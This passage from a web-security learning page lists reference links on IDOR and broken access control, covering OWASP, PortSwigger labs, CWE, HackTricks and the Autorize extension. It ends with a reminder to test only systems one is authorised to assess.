  to: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
  target: _blank
  ---
  OWASP Top 10 #1 risk — Broken Access Control encompassing IDOR, privilege escalation, and authorization bypass.
  ::

  ::card
  ---
  title: OWASP WSTG — IDOR Testing
  icon: i-lucide-clipboard-check
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
  target: _blank
  ---
  OWASP Web Security Testing Guide — Step-by-step methodology for testing IDOR (WSTG-ATHZ-04).
  ::

  ::card
  ---
  title: PortSwigger — IDOR Labs
  icon: i-lucide-flask-conical
  to: https://portswigger.net/web-security/access-control/idor
  target: _blank
  ---
  PortSwigger Web Security Academy — Interactive IDOR labs with detailed solutions and explanations.
  ::

  ::card
  ---
  title: CWE-639 — User-Controlled Key
  icon: i-lucide-database
  to: https://cwe.mitre.org/data/definitions/639.html
  target: _blank
  ---
  MITRE CWE — Authorization Bypass Through User-Controlled Key with observed examples and mitigations.
  ::

  ::card
  ---
  title: HackTricks — IDOR
  icon: i-lucide-terminal
  to: https://book.hacktricks.wiki/en/pentesting-web/idor.html
  target: _blank
  ---
  Comprehensive practical IDOR exploitation guide with real-world bypass techniques and payload examples.
  ::

  ::card
  ---
  title: OWASP API Security — BOLA
  icon: i-lucide-server
  to: https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
  target: _blank
  ---
  API Security Top 10 — API1:2023 Broken Object Level Authorization (BOLA) — the API equivalent of IDOR.
  ::

  ::card
  ---
  title: Autorize — Burp Extension
  icon: i-lucide-plug
  to: https://github.com/PortSwigger/autorize
  target: _blank
  ---
  Automated authorization testing Burp Suite extension — essential tool for detecting IDOR at scale.
  ::

  ::card
  ---
  title: IDOR Bug Bounty Methodology
  icon: i-lucide-bug
  to: https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
  target: _blank
  ---
  Community-maintained IDOR hunting methodology with real-world tips from successful bug bounty hunters.
  ::
::

::tip{to="https://portswigger.net/web-security/access-control/idor"}
Practice IDOR exploitation safely using the **PortSwigger Web Security Academy** free labs and the Docker Compose lab environment provided above. Always test only on systems you have explicit authorization to assess.
::